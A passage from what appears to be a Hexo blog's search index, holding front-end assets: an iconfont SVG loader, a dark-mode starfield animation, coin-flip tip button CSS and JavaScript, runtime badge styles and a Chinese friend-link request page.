80.865592c-103.226783-107.82079-270.382217-107.82079-373.581325 0l-191.619905 200.199075c-80.284423 83.854464-97.66416 208.197074-52.997128 310.233843 0.52582 1.079315 0.857917 2.15863 1.383737 3.26562 0.166048 0.166048 0.166048 0.359772 0.332097 0.719543 12.536658 26.291004 39.46418 43.366319 69.3529 41.013966 39.076734-3.265619 68.439634-39.021384 65.312388-79.869302a78.679288 78.679288 0 0 0-7.998-28.864755c-19.78744-46.631938-11.097571-103.448181 25.377737-141.750022l191.287808-199.839302a118.088119 118.088119 0 0 1 172.026188 0c47.434506 49.537786 47.434506 130.126631 0 179.692091l-71.234782 74.417378 0.52582 0.553495a75.939489 75.939489 0 0 0-24.353772 61.88072c3.15492 40.847917 37.3609 71.51153 76.465309 68.245911a69.463599 69.463599 0 0 0 46.908685-23.938651l0.166049 0.166048 72.646194-75.856464c103.03306-107.82079 103.03306-282.642127 0-390.269194z" fill="#5c8add" ></path></symbol><symbol id="icon-liaotian" viewBox="0 0 1171 1024"><path d="M1068.71699 0.243751H102.193768C46.228437 0.243751 0.500666 45.045267 0.500666 99.74309v696.251622c0 54.697824 45.727771 99.450589 101.693102 99.450589h329.113198l120.851966 114.465677a48.652788 48.652788 0 0 0 66.641644 0l120.851966-114.465677h329.064448c55.965331 0 101.741852-44.752765 101.741852-99.450589V99.74309C1170.458842 45.045267 1124.682321 0.243751 1068.71699 0.243751z m-439.776354 596.849784h-370.989696c-27.933915 0-50.846551-22.425133-50.846551-49.774045 0-27.348912 22.912636-49.725294 50.846551-49.725294h370.989696c27.933915 0 50.846551 22.376382 50.846551 49.725294 0 27.348912-22.912636 49.774045-50.846551 49.774045z m287.18795-211.381252H254.782171a50.456549 50.456549 0 0 1-50.846551-49.725294c0-27.397662 22.912636-49.774045 50.846551-49.774045h661.346415c27.933915 0 50.846551 22.376382 50.846551 49.774045 0 27.348912-22.912636 49.725294-50.846551 49.725294z" fill="#5C8ADD" ></path></symbol><symbol id="icon-xinfeng" viewBox="0 0 1400 1024"><path d="M1301.63733163 214.78520234a207.81921797 207.81921797 0 0 1 7.02423018 52.42036465v489.73590176a205.10753818 205.10753818 0 0 1-205.05853125 205.05853125H283.05853124A205.15654424 205.15654424 0 0 1 77.99999999 756.79444971V267.20556699a201.36672685 201.36672685 0 0 1 7.02423106-52.42036465L586.24393329 562.1905874c69.44187217 51.96297217 146.36536612 49.13694404 214.1736961 0zM1103.60303056 62.0000167H283.05853124A204.50312753 204.50312753 0 0 0 106.37462518 163.41030547l489.71956641 335.75823018c62.43397646 50.77048623 127.85733457 50.31309463 194.62019765 0L1280.28693749 163.41030547A204.68281729 204.68281729 0 0 0 1103.60303056 62.0000167z m0 0" fill="#5c8add" ></path></symbol><symbol id="icon-QQ1" viewBox="0 0 1024 1024"><path d="M0 512a512 512 0 1 0 1024 0A512 512 0 1 0 0 512z" fill="#18ACFC" ></path><path d="M500.113 228.39c118.396-1.518 178.924 61.004 201 156 3.497 15.048 0.15 34.807 0 50 27.143 5.682 33.087 60.106 10 75v1h1c8.26 14.33 19.04 28.125 26 44 7.332 16.723 9.306 35.16 14 55 4.024 17.01-2.287 51.505-10 57-0.771 0.683-2.231 1.312-3 2-14.601-3.016-30.377-16.865-38-27-3.065-4.074-5.275-9.672-10-12-0.395 21.568-12.503 41.15-22 55-3.514 5.123-14.073 13.217-14 18 3.691 2.836 8.305 2.956 13 5 10.513 4.577 25.449 13.168 32 22 2.334 3.146 5.548 7.555 7 11 16.193 38.414-36.527 48.314-63 54-27.185 5.839-77.818-10.224-92-19-8.749-5.414-16.863-18.573-29-19-3.666 2.389-14.438 1.132-20 1-16.829 32.804-101.913 47.868-148 31-14.061-5.146-43.398-17.695-38-40 4.437-18.327 19.947-29.224 35-37 5.759-2.975 18.915-4.419 22-10-13.141-8.988-24.521-28.659-31-44-3.412-8.077-4.193-25.775-9-32-7.789 12.245-32.097 36.91-52 33-3.071-4.553-7.213-9.097-9-15-4.792-15.835-1.81-40.379 2-54 8.117-29.02 16.965-50.623 32-72 4.672-6.643 11.425-12.135 16-19-8.945-9.733-6.951-37.536-1-49 4.002-7.709 9.701-7.413 10-20-1.92-3.022-0.071-8.604-1-13-4.383-20.75 3.273-47.552 9-63 19.8-53.421 53.712-90.466 105-112 11.986-5.033 25.833-7.783 39-11 5.322-1.3 11.969 0.518 16-2z" fill="#FFFFFF" ></path></symbol><symbol id="icon-rss" viewBox="0 0 1024 1024"><path d="M749.61196492 908.06119793C749.61196492 560.41848146 463.58151854 274.36328126 115.93880207 274.36328126V115.93880207c434.50388795 0 792.12239584 357.61850789 792.12239586 792.12239586zM224.55858562 690.72261555a108.91682943 108.91682943 0 0 1 108.69404499 108.74355267C333.25263061 859.29616292 284.24005737 908.06119793 224.31104736 908.06119793 164.48105265 908.06119793 115.96355592 859.41993206 115.96355592 799.46616822s48.69077351-108.71879883 108.61978351-108.74355267zM641.01693522 908.06119793h-153.96879069c0-203.60020956-167.50913289-371.13409627-371.10934246-371.13409629v-153.96879068c288.03550619 0 525.07813313 237.11688843 525.07813315 525.10288697z" fill="#FFA500" ></path></symbol><symbol id="icon-youxiang" viewBox="0 0 1024 1024"><path d="M583.60666667 972h-68.08c-8.43333333 0-15.33333333-6.9-15.33333334-15.33333333V609.52c0-8.43333333 6.9-15.33333333 15.33333334-15.33333333h68.08c8.43333333 0 15.33333333 6.9 15.33333333 15.33333333V956.66666667c0 8.43333333-6.9 15.33333333-15.33333333 15.33333333z" fill="#629FF9" ></path><path d="M294.42 167c-113.62 0-205.77333333 92-205.77333333 205.31333333v336.72h411.39333333V372.31333333c0.15333333-113.31333333-92-205.31333333-205.62-205.31333333z" fill="#2166CC" ></path><path d="M519.97333333 627H216.98666667c-25.45333333 0-46-20.54666667-46-46V393.78c0-25.45333333 20.54666667-46 46-46h302.98666666c25.45333333 0 46 20.54666667 46 46V581c0 25.45333333-20.54666667 46-46 46z" fill="#D2E4FF" ></path><path d="M565.97333333 397a49.22 49.22 0 0 0-49.37333333-49.22H220.36c-27.29333333 0-49.37333333 22.08-49.37333333 49.22v10.27333333l179.4 94.60666667c11.34666667 5.98 24.84 5.98 36.18666666 0l179.4-94.60666667v-10.27333333z" fill="#FFFFFF" ></path><path d="M730.5 167h-427.8v0.46c109.78666667 4.29333333 197.49333333 94.3 197.49333333 205.00666667v336.72h411.39333334c27.29333333 0 49.37333333-22.08 49.37333333-49.22V397c0-126.96-103.19333333-230-230.46-230z" fill="#4E8DF6" ></path><path d="M845.80666667 52H681.12666667c-9.04666667 0-16.40666667 7.36-16.40666667 16.40666667v336.72a24.67133333 24.67133333 0 1 0 49.37333333 0V134.18666667h131.71333334c9.04666667 0 16.40666667-7.36 16.40666666-16.40666667V68.40666667c0-9.04666667-7.36-16.40666667-16.40666666-16.40666667z" fill="#2166CC" ></path><path d="M896.25333333 659.81333333h-35.11333333c-8.43333333 0-15.33333333-6.9-15.33333333-15.33333333v-35.11333333c0-8.43333333 6.9-15.33333333 15.33333333-15.33333334h35.11333333c8.43333333 0 15.33333333 6.9 15.33333334 15.33333334v35.11333333c0 8.58666667-6.9 15.33333333-15.33333334 15.33333333z" fill="#FFFFFF" ></path><path d="M88.8 709.18666667l-24.22666667 131.40666666c-9.66 54.43333333 26.83333333 98.59333333 81.26666667 98.59333334h213.9c54.58666667 0 106.56666667-44.16 116.22666667-98.59333334l23.15333333-131.40666666H88.8z" fill="#2974CE" ></path></symbol><symbol id="icon-gitHub" viewBox="0 0 1049 1024"><path d="M523.6581816 52C262.83923907 52 52 262.8401375 52 523.6581816c0 208.49703047 135.09433812 384.97758117 322.50789391 447.44906532 23.42658172 4.68531653 32.01647887-10.15136894 32.01647796-22.64584583 0-10.93210574-0.78163433-48.41463703-0.78163433-87.45953855-131.18885996 28.11189824-158.5200223-56.22379738-158.52002231-56.22379739-21.08437312-54.66232469-52.3201152-68.71827336-52.3201152-68.71827335-42.94858371-28.89353348 3.12384382-28.89353348 3.12384384-28.89353348 47.63479867 3.12384382 72.62285398 48.41643391 72.62285398 48.4164339 42.16784782 71.84121875 110.10538527 51.53758242 137.43654672 39.04400399 3.90457972-30.45500618 16.3990566-51.5393793 29.67427028-63.25222094-104.64023039-10.93300418-214.74561566-51.53848086-214.74561657-232.70524742 0-51.53848086 18.74126609-93.70632867 48.4164339-126.50444187-4.68621496-11.71284164-21.08527156-60.12837711 4.6844181-124.94207075 0 0 39.82563922-12.49447688 129.62738726 48.41463704 37.48253129-10.15136894 78.08980484-15.61742227 117.91454562-15.61742137s80.43201433 5.46605242 117.91454473 15.61742137c89.80264648-60.90911391 129.62828571-48.41463703 129.62828571-48.41463704 25.76879122 64.81369363 9.37063305 113.22922911 4.68531651 124.94207075 30.45410773 32.79721477 48.41463703 74.96506258 48.41463703 126.50444187 0 181.16676656-110.10538527 220.99150644-215.52545401 232.70524742 17.1797934 14.83668547 32.01647887 42.94858371 32.01647886 87.45953946 0 63.25222094-0.78163433 114.009965-0.78163523 129.62738636 0 12.49447688 8.59079468 27.33116234 32.01737731 22.64584583 187.41265734-62.4705866 322.50699547-238.95203574 322.50699546-447.44996375C995.31636231 262.8401375 783.69369203 52 523.6581816 52z" fill="#663399" ></path><path d="M230.82365863 729.03136735c-0.7807359 2.34310703-4.68531653 3.12384382-7.80916035 1.56237113s-5.46605242-4.68531653-3.90368129-7.02842356c0.7807359-2.34220859 4.68531653-3.12384382 7.80826192-1.56147269s4.68531653 4.68531653 3.90457972 7.02752512z m18.7412661 21.08437312c-2.34220859 2.34220859-7.02752512 0.78163433-9.37063305-2.34310703-3.12294539-3.12294539-3.90457972-7.80826192-1.5614727-10.15136894 2.34220859-2.34220859 6.24678922-0.7807359 9.37063305 2.34310702 3.12384382 3.90457972 3.90457972 8.58899782 1.5614727 10.15136895zM268.30618992 777.44690281c-3.12294539 2.34220859-7.80826192 0-10.15136895-3.90457972-3.12384382-3.90457972-3.12384382-9.37063305 0-10.93210574 3.12384382-2.34310703 7.80916035 0 10.15226739 3.90457972 3.12294539 3.90368129 3.12294539 8.58899782 0 10.93210574z m25.76968965 26.55042555c-2.34220859 3.12294539-7.80916035 2.34220859-12.49447688-1.56237113-3.90457972-3.90368129-5.46605242-9.37063305-2.34220859-11.71284164 2.34220859-3.12384382 7.80826192-2.34310703 12.49447687 1.56147269 3.90368129 3.12384382 4.68531653 8.58989625 2.3422086 11.71374008z m35.1403227 14.83668637c-0.78163433 3.90457972-6.24768766 5.46605242-11.71374008 3.90457972-5.46605242-1.5614727-8.58899782-6.24768766-7.80916036-9.37063305 0.78163433-3.90457972 6.24768766-5.46605242 11.71374009-3.90457972 5.46605242 1.5614727 8.58899782 5.46605242 7.80916035 9.37063305z m38.26416562 3.12384382c0 3.90457972-4.68621496 7.02752512-10.15226738 7.02752512-5.46605242 0-10.15226738-3.12294539-10.15226739-7.02752512s4.68621496-7.02842356 10.15226739-7.02842445c5.46605242 0 10.15226738 3.12384382 10.15226738 7.02842445z m35.92016106-6.24768766c0.78163433 3.90457972-3.12384382 7.80916035-8.58899872 8.58989625-5.46695086 0.78163433-10.15226738-1.5614727-10.93390172-5.46605241-0.77983747-3.90457972 3.12384382-7.80916035 8.5907947-8.58899872 5.46605242-0.78163433 10.15136894 1.56057426 10.93210574 5.46515488z m0 0" fill="#663399" ></path></symbol><symbol id="icon-bilibili" viewBox="0 0 1024 1024"><path d="M832.61667555 181.33447111h-164.32545185l74.45617778-74.45617778c12.84020148-12.84020148 12.84020148-30.8140563 0-43.65425778-12.84020148-12.84020148-30.8140563-12.84020148-43.65425778 0L573.2882963 189.04101925H450.04420741L324.2272237 63.23617185c-10.26730667-12.84020148-25.68040297-15.40096-41.08136295-7.70654815-2.57289482 0-2.57289482 2.57289482-5.13365334 5.13365333-12.84020148 12.84020148-12.84020148 30.8140563 0 43.65425779l77.02907259 77.02907259h-164.32545185c-89.86927408 0-164.32545185 74.45617778-164.32545185 164.32545184v408.24073483c0 87.29637925 74.45617778 161.75255703 164.32545185 161.75255703h25.68040296c0 30.8140563 25.68040297 53.92156445 53.92156444 53.92156444s53.92156445-25.68040297 53.92156445-53.92156444H704.23893333c2.57289482 30.8140563 28.24116148 53.92156445 59.05521778 51.34866964 28.24116148-2.57289482 48.78791111-23.10750815 51.34866964-51.34866964h20.53461333c89.86927408 0 164.32545185-74.45617778 164.32545184-164.32545186V343.09916445c-2.56075852-89.86927408-77.02907259-161.76469333-166.88621037-161.76469334z m-5.13365333 634.19429926H200.99527111c-33.37481482 0-59.05521778-28.24116148-61.61597629-61.61597629l-2.57289482-415.94728297c0-33.37481482 28.24116148-61.6159763 61.6159763-61.61597629h626.48775111c33.37481482 0 59.05521778 28.24116148 61.61597629 61.61597629l2.57289482 415.94728297c-2.57289482 35.93557333-28.24116148 61.6159763-61.6159763 61.61597629z" fill="#ff7299" ></path><path d="M403.82919111 417.55534222l15.40096 77.0290726-205.40681481 38.50846815-15.40096-77.0290726 205.40681481-38.50846815z m197.70026667 77.0290726l15.40096-77.0290726 205.40681481 38.50846815-15.40096 77.0290726-205.40681481-38.50846815z m41.08136297 161.75255703c0 2.57289482 0 7.70654815-2.57289483 10.26730667-12.84020148 28.24116148-41.08136297 46.2150163-74.45617777 48.78791111-20.53461333 0-41.08136297-10.26730667-53.92156445-25.68040296-15.40096 15.40096-33.37481482 25.68040297-53.92156445 25.68040296-30.8140563-2.57289482-59.05521778-20.53461333-74.45617777-48.78791111 0-2.57289482-2.57289482-5.13365333-2.57289481-10.26730667 0-10.26730667 7.70654815-17.97385482 17.97385481-20.53461333h2.57289482c7.70654815 0 12.84020148 2.57289482 15.40096 10.26730666 0 0 20.53461333 28.24116148 38.50846815 28.24116149 35.94770963 0 35.94770963-30.8140563 56.48232296-53.92156445 23.10750815 25.68040297 23.10750815 53.92156445 56.48232296 53.92156445 23.10750815 0 38.50846815-28.24116148 38.50846815-28.24116149 2.57289482-5.13365333 10.26730667-10.26730667 15.40096-10.26730666 10.26730667-2.57289482 17.97385482 5.13365333 20.53461333 15.40096v5.13365333h0.0364089z" fill="#ff7299" ></path></symbol></svg>',    o = (o = document.getElementsByTagName("script"))[o.length - 1].getAttribute("data-injectcss"),    p = function (c, l) {      l.parentNode.insertBefore(c, l);    };  if (o && !c.__iconfont__svg__cssinject__) {    c.__iconfont__svg__cssinject__ = !0;    try {      document.write(        "<style>.svgfont {display: inline-block;width: 1em;height: 1em;fill: currentColor;vertical-align: -0.1em;font-size:16px;}</style>"      );    } catch (c) {      console && console.log(c);    }  }  function d() {    i || ((i = !0), a());  }  function m() {    try {      t.documentElement.doScroll("left");    } catch (c) {      return void setTimeout(m, 50);    }    d();  }  (l = function () {    var c,      l = document.createElement("div");    (l.innerHTML = v),      (v = null),      (l = l.getElementsByTagName("svg")[0]) &&        (l.setAttribute("aria-hidden", "true"),        (l.style.position = "absolute"),        (l.style.width = 0),        (l.style.height = 0),        (l.style.overflow = "hidden"),        (l = l),        (c = document.body).firstChild ? p(l, c.firstChild) : c.appendChild(l));  }),    document.addEventListener      ? ~["complete", "loaded", "interactive"].indexOf(document.readyState)        ? setTimeout(l, 0)        : ((h = function () {            document.removeEventListener("DOMContentLoaded", h, !1), l();          }),          document.addEventListener("DOMContentLoaded", h, !1))      : document.attachEvent &&        ((a = l),        (t = c.document),        (i = !1),        m(),        (t.onreadystatechange = function () {          "complete" == t.readyState && ((t.onreadystatechange = null), d());        }));})(window);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/universe.js"/>
      <url>/js/universe.js</url>
      
        <content type="html"><![CDATA[function dark() {window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var n,e,i,h,t=.05,s=document.getElementById("universe"),o=!0,a="180,184,240",r="226,225,142",d="226,225,224",c=[];function f(){n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute("width",n),s.setAttribute("height",e)}function u(){h.clearRect(0,0,n,e);for(var t=c.length,i=0;i<t;i++){var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()}}function y(){this.reset=function(){this.giant=m(3),this.comet=!this.giant&&!o&&m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)},this.fadeIn=function(){this.fadingIn&&(this.fadingIn=!(this.opacity>this.opacityTresh),this.opacity+=this.do)},this.fadeOut=function(){this.fadingOut&&(this.fadingOut=!(this.opacity<0),this.opacity-=this.do/2,(this.x>n||this.y<0)&&(this.fadingOut=!1,this.reset()))},this.draw=function(){if(h.beginPath(),this.giant)h.fillStyle="rgba("+a+","+this.opacity+")",h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet){h.fillStyle="rgba("+d+","+this.opacity+")",h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t<30;t++)h.fillStyle="rgba("+d+","+(this.opacity-this.opacity/20*t)+")",h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()}else h.fillStyle="rgba("+r+","+this.opacity+")",h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()},this.move=function(){this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&&this.reset(),(this.x>n-n/4||this.y<0)&&(this.fadingOut=!0)},setTimeout(function(){o=!1},50)}function m(t){return Math.floor(1e3*Math.random())+1<10*t}function l(t,i){return Math.random()*(i-t)+t}f(),window.addEventListener("resize",f,!1),function(){h=s.getContext("2d");for(var t=0;t<i;t++)c[t]=new y,c[t].reset();u()}(),function t(){document.getElementsByTagName('html')[0].getAttribute('data-theme')=='dark'&&u(),window.requestAnimationFrame(t)}()};dark()]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<div style="font-size: 20px;" class="youlian">👉友链格式</div><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>名称：</td><td>baicai Blog</td></tr><tr><td>网址：</td><td><a href="https://baicai.icu">https://baicai.icu</a></td></tr><tr><td>图标：</td><td><a href="https://baicai.icu/img/avatar.gif">https://baicai.icu/img/avatar.gif</a></td></tr><tr><td>描述：</td><td>一个记录技术、阅读、生活的博客</td></tr></tbody></table></div><p><br/></p><p><div style="font-size: 20px;">👉友链申请要求</div></p><blockquote><p>秉承互换友链原则、文章定期更新<!-- 、网站在工信部备案 -->、不能有太多广告、个人描述字数控制在15字内</p></blockquote><p><br/></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/coin/coin.css"/>
      <url>/css/coin/coin.css</url>
      
        <content type="html"><![CDATA[.tip-button {    border: 0;    border-radius: 0.25rem;    cursor: pointer;    font-size: 20px;    font-weight: 600;    height: 2.6rem;    margin-bottom: -4rem;    outline: 0;    position: relative;    top: 0;    transform-origin: 0% 100%;    transition: transform 50ms ease-in-out;    width: auto;    -webkit-tap-highlight-color: transparent;}.tip-button:active {    transform: rotate(4deg);}.tip-button.clicked {    animation: 150ms ease-in-out 1 shake;    pointer-events: none;}.tip-button.clicked .tip-button__text {    opacity: 0;    transition: opacity 100ms linear 200ms;}.tip-button.clicked::before {    height: 0.5rem;    width: 60%;    background: $button-hover-color;}.tip-button.clicked .coin {    transition: margin-bottom 1s linear 200ms;    margin-bottom: 0;}.tip-button.shrink-landing::before {    transition: width 200ms ease-in;    width: 0;}.tip-button.coin-landed::after {    opacity: 1;    transform: scale(1);    transform-origin: 50% 100%;}.tip-button.coin-landed .coin-wrapper {    background: radial-gradient(circle at 35% 97%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.04rem), radial-gradient(            circle at 45% 92%,            rgba(3, 16, 50, 0.4) 0.04rem,            transparent 0.02rem    ), radial-gradient(circle at 55% 98%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.04rem), radial-gradient(circle at            65% 96%, rgba(3, 16, 50, 0.4) 0.06rem, transparent 0.06rem);    background-position: center bottom;    background-size: 100%;    bottom: -1rem;    opacity: 0;    transform: scale(2) translateY(-10px);}.tip-button__text {    color: #fff;    margin-right: 1.8rem;    opacity: 1;    position: relative;    transition: opacity 100ms linear 500ms;    z-index: 3;}.tip-button::before {    border-radius: 0.25rem;    bottom: 0;    content: "";    display: block;    height: 100%;    left: 50%;    position: absolute;    transform: translateX(-50%);    transition: height 250ms ease-in-out 400ms, width 250ms ease-in-out 300ms;    width: 100%;    z-index: 2;}.tip-button::after {    bottom: -1rem;    color: white;    content: "ヾ(≧O≦)〃嗷~"; /*点击后显示的内容*/    height: 110%;    left: 0;    opacity: 0;    position: absolute;    pointer-events: none;    text-align: center;    transform: scale(0);    transform-origin: 50% 20%;    transition: transform 200ms cubic-bezier(0, 0, 0.35, 1.43);    width: 100%;    z-index: 1;}.coin-wrapper {    background: none;    bottom: 0;    height: 18rem;    left: 0;    opacity: 1;    overflow: hidden;    pointer-events: none;    position: absolute;    transform: none;    transform-origin: 50% 100%;    transition: opacity 200ms linear 100ms, transform 300ms ease-out;    width: 100%;}.coin {    --front-y-multiplier: 0;    --back-y-multiplier: 0;    --coin-y-multiplier: 0;    --coin-x-multiplier: 0;    --coin-scale-multiplier: 0;    --coin-rotation-multiplier: 0;    --shine-opacity-multiplier: 0.4;    --shine-bg-multiplier: 50%;    bottom: calc(var(--coin-y-multiplier) * 1rem - 3.5rem);    height: 3.5rem;    margin-bottom: 3.05rem;    position: absolute;    right: calc(var(--coin-x-multiplier) * 34% + 16%);    transform: translateX(50%) scale(calc(0.4 + var(--coin-scale-multiplier))) rotate(calc(var(    --coin-rotation-multiplier    ) * -1deg));    transition: opacity 100ms linear 200ms;    width: 3.5rem;    z-index: 3;}.coin__front,.coin__middle,.coin__back,.coin::before,.coin__front::after,.coin__back::after {    border-radius: 50%;    box-sizing: border-box;    height: 100%;    left: 0;    position: absolute;    width: 100%;    z-index: 3;}.coin__front {    background: radial-gradient(circle at 50% 50%, transparent 50%, rgba(115, 124, 153, 0.4) 54%, #c2cadf 54%),    linear-gradient(210deg, #8590b3 32%, transparent 32%), linear-gradient(150deg, #8590b3 32%, transparent 32%),    linear-gradient(to right, #8590b3 22%, transparent 22%, transparent 78%, #8590b3 78%), linear-gradient(            to bottom,            #fcfaf9 44%,            transparent 44%,            transparent 65%,            #fcfaf9 65%,            #fcfaf9 71%,            #8590b3 71%    ), linear-gradient(to right, transparent 28%, #fcfaf9 28%, #fcfaf9 34%, #8590b3 34%, #8590b3 40%, #fcfaf9 40%, #fcfaf9            47%, #8590b3 47%, #8590b3 53%, #fcfaf9 53%, #fcfaf9 60%, #8590b3 60%, #8590b3 66%, #fcfaf9 66%, #fcfaf9 72%, transparent            72%);    background-color: #8590b3;    background-size: 100% 100%;    transform: translateY(calc(var(--front-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--front-scale-multiplier));}.coin__front::after {    background: rgba(0, 0, 0, 0.2);    content: "";    opacity: var(--front-y-multiplier);}.coin__middle {    background: #737c99;    transform: translateY(calc(var(--middle-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--middle-scale-multiplier));}.coin__back {    background: radial-gradient(circle at 50% 50%, transparent 50%, rgba(115, 124, 153, 0.4) 54%, #c2cadf 54%),    radial-gradient(circle at 50% 40%, #fcfaf9 23%, transparent 23%), radial-gradient(circle at 50% 100%, #fcfaf9 35%, transparent            35%);    background-color: #8590b3;    background-size: 100% 100%;    transform: translateY(calc(var(--back-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--back-scale-multiplier));}.coin__back::after {    background: rgba(0, 0, 0, 0.2);    content: "";    opacity: var(--back-y-multiplier);}.coin::before {    background: radial-gradient(circle at 25% 65%, transparent 50%, rgba(255, 255, 255, 0.9) 90%), linear-gradient(55deg, transparent    calc(var(--shine-bg-multiplier) + 0%), #e9f4ff calc(var(--shine-bg-multiplier) + 0%), transparent calc(var(            --shine-bg-multiplier            ) + 50%));    content: "";    opacity: var(--shine-opacity-multiplier);    transform: translateY(calc(var(--middle-y-multiplier) * 0.3181818182rem / -2)) scaleY(var(--middle-scale-multiplier))    rotate(calc(var(--coin-rotation-multiplier) * 1deg));    z-index: 10;}.coin::after {    background: #737c99;    content: "";    height: 0.3181818182rem;    left: 0;    position: absolute;    top: 50%;    transform: translateY(-50%);    width: 100%;    z-index: 2;}@keyframes shake {    0% {        transform: rotate(4deg);    }    66% {        transform: rotate(-4deg);    }    100% {        transform: rotate();    }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/runtime/runtime.min.css"/>
      <url>/css/runtime/runtime.min.css</url>
      
        <content type="html"><![CDATA[div#runtime{width:180px;margin:auto;color:#fff;padding-inline:5px;border-radius:10px;background-color:rgba(0,0,0,.7)}#workboard{font-size:12px}[data-theme=dark] div#runtime{color:#28b4c8;box-shadow:0 0 5px rgba(28,69,218,.71);animation:flashlight 1s linear infinite alternate}#ghbdages .github-badge img{height:20px}@-moz-keyframes flashlight{from{box-shadow:0 0 5px #1478d2}to{box-shadow:0 0 2px #1478d2}}@-webkit-keyframes flashlight{from{box-shadow:0 0 5px #1478d2}to{box-shadow:0 0 2px #1478d2}}@-o-keyframes flashlight{from{box-shadow:0 0 5px #1478d2}to{box-shadow:0 0 2px #1478d2}}@keyframes flashlight{from{box-shadow:0 0 5px #1478d2}to{box-shadow:0 0 2px #1478d2}}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/coin/coin.js"/>
      <url>/js/coin/coin.js</url>
      
        <content type="html"><![CDATA[var tipButtons = document.querySelectorAll(".tip-button");function coinAudio() {    var coinAudio = document.getElementById("coinAudio");    if (coinAudio) {        coinAudio.play(); //有音频时播放    }}// Loop through all buttons (allows for multiple buttons on page)tipButtons.forEach(button => {    var coin = button.querySelector(".coin");    // The larger the number, the slower the animation    coin.maxMoveLoopCount = 90;    button.addEventListener("click", () => {        if (/Android|webOS|BlackBerry/i.test(navigator.userAgent)) return true; //媒体选择        if (button.clicked) return;        button.classList.add("clicked");        // Wait to start flipping th coin because of the button tilt animation        setTimeout(() => {            // Randomize the flipping speeds just for fun            coin.sideRotationCount = Math.floor(Math.random() * 5) * 90;            coin.maxFlipAngle = (Math.floor(Math.random() * 4) + 3) * Math.PI;            button.clicked = true;            flipCoin();            coinAudio();        }, 50);    });    var flipCoin = () => {        coin.moveLoopCount = 0;        flipCoinLoop();    };    var resetCoin = () => {        coin.style.setProperty("--coin-x-multiplier", 0);        coin.style.setProperty("--coin-scale-multiplier", 0);        coin.style.setProperty("--coin-rotation-multiplier", 0);        coin.style.setProperty("--shine-opacity-multiplier", 0.4);        coin.style.setProperty("--shine-bg-multiplier", "50%");        coin.style.setProperty("opacity", 1);        // Delay to give the reset animation some time before you can click again        setTimeout(() => {            button.clicked = false;        }, 300);    };    var flipCoinLoop = () => {        coin.moveLoopCount++;        var percentageCompleted = coin.moveLoopCount / coin.maxMoveLoopCount;        coin.angle = -coin.maxFlipAngle * Math.pow(percentageCompleted - 1, 2) + coin.maxFlipAngle;        // Calculate the scale and position of the coin moving through the air        coin.style.setProperty("--coin-y-multiplier", -11 * Math.pow(percentageCompleted * 2 - 1, 4) + 11);        coin.style.setProperty("--coin-x-multiplier", percentageCompleted);        coin.style.setProperty("--coin-scale-multiplier", percentageCompleted * 0.6);        coin.style.setProperty("--coin-rotation-multiplier", percentageCompleted * coin.sideRotationCount);        // Calculate the scale and position values for the different coin faces        // The math uses sin/cos wave functions to similate the circular motion of 3D spin        coin.style.setProperty("--front-scale-multiplier", Math.max(Math.cos(coin.angle), 0));        coin.style.setProperty("--front-y-multiplier", Math.sin(coin.angle));        coin.style.setProperty("--middle-scale-multiplier", Math.abs(Math.cos(coin.angle), 0));        coin.style.setProperty("--middle-y-multiplier", Math.cos((coin.angle + Math.PI / 2) % Math.PI));        coin.style.setProperty("--back-scale-multiplier", Math.max(Math.cos(coin.angle - Math.PI), 0));        coin.style.setProperty("--back-y-multiplier", Math.sin(coin.angle - Math.PI));        coin.style.setProperty("--shine-opacity-multiplier", 4 * Math.sin((coin.angle + Math.PI / 2) % Math.PI) - 3.2);        coin.style.setProperty("--shine-bg-multiplier", -40 * (Math.cos((coin.angle + Math.PI / 2) % Math.PI) - 0.5) + "%");        // Repeat animation loop        if (coin.moveLoopCount < coin.maxMoveLoopCount) {            if (coin.moveLoopCount === coin.maxMoveLoopCount - 6) button.classList.add("shrink-landing");            window.requestAnimationFrame(flipCoinLoop);        } else {            button.classList.add("coin-landed");            coin.style.setProperty("opacity", 0);            setTimeout(() => {                button.classList.remove("clicked", "shrink-landing", "coin-landed");                setTimeout(() => {                    resetCoin();                }, 300);            }, 1500);        }    };});]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.min.js"/>
      <url>/js/runtime/runtime.min.js</url>
      
